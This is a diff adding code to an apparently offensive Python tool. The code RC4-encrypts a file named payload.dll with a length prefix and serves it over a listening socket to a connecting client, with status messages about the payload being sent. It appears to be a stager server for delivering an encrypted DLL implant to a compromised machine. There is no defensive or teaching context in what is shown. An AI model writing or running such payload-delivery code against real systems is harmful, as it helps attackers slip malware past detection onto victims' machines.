@@ -28,3 +28,20 @@ def rc4(key, data):
 with open('payload.dll', 'rb') as f:
     dll = f.read()
 
+combined = struct.pack("<I", len(dll)) + dll
+encrypted = rc4(KEY, combined)
+
+print(f'[*] payload.dll : {len(dll)} bytes')
+print(f'[*] encrypted : {len(encrypted)} bytes')
+print(f'[*] listening on {HOST}:{PORT}')
+
+skt = socket.socket()
+skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+skt.bind((HOST, PORT))
+skt.listen(1)
+
+conn, addr = skt.accept()
+print(f'[+] Connection from {addr}')
+conn.sendall(encrypted)
+conn.close()
+print(f'[+] payload sent')
